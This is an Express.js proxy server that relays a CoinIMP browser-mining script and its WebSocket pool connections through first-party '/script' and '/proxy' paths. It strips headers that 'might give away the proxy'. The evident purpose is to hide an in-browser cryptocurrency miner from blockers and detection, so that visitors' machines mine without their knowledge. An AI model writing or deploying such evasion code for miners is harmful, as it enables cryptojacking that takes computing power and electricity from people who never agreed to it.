const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');

const app = express();

app.use(cors());

// Proxy requests to the JS file
app.use('/script', createProxyMiddleware({ 
    target: 'https://www.hostingcloud.racing/FIIr.js', 
    changeOrigin: true,
    ignorePath: true, // ignore the '/script' path and request the target directly
    onProxyRes: function(proxyRes, req, res) {
        // Strip out headers that might give away the proxy
        delete proxyRes.headers['x-powered-by'];
    }
}));

// Proxy the WebSocket connections to the CoinIMP pool
app.use('/proxy', createProxyMiddleware({ 
    target: 'wss://ws.hostingcloud.racing', 
    changeOrigin: true,
    ws: true,
    pathRewrite: {
        '^/proxy': '', // remove base path
    },
}));

// A simple health check
app.get('/', (req, res) => {
    res.send('Proxy is running');
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Proxy server running on port ${PORT}`);
});
